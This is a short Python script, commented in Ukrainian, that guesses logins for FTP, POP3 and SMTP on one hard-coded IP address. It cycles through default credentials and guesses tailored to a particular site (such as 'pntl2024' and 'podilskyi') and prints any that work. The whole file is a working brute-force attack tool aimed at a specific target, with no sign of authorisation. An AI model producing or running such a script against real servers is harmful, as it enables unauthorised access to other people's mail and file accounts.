import socket
import poplib
import smtplib
import ftplib
import time

ip = "45.94.158.128"

# Комбінації, які мають найбільший сенс для цього сайту
creds = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "root"),
    ("admin", "pntl"),
    ("admin", "pntl2024"),
    ("admin", "pntl2025"),
    ("admin", "podilskyi"),
    ("admin", "12345678"),
    ("admin", "qwerty"),
    ("root", "root"),
    ("root", "password"),
    ("root", "123456"),
    ("root", "pntl"),
    ("pntl", "pntl"),
    ("pntl", "password"),
    ("pntl", "123456"),
    ("ftp", "ftp"),
    ("ftp", "password"),
    ("ftp", "123456"),
    ("webmaster", "webmaster"),
    ("webmaster", "password"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("test", "password"),
]

print("[*] Починаю перевірку...")

for user, pwd in creds:
    # === FTP ===
    try:
        ftp = ftplib.FTP(ip, timeout=3)
        ftp.login(user, pwd)
        print(f"[+] FTP: {user}:{pwd}")
        ftp.quit()
    except:
        pass

    # === POP3 ===
    try:
        pop = poplib.POP3(ip, timeout=3)
        pop.user(user)
        pop.pass_(pwd)
        print(f"[+] POP3: {user}:{pwd}")
        pop.quit()
    except:
        pass

    # === SMTP ===
    try:
        smtp = smtplib.SMTP(ip, 25, timeout=3)
        smtp.ehlo()
        smtp.login(user, pwd)
        print(f"[+] SMTP: {user}:{pwd}")
        smtp.quit()
    except:
        pass

    print(f"[-] {user}:{pwd} не підійшов")

print("[*] Перевірку завершено.")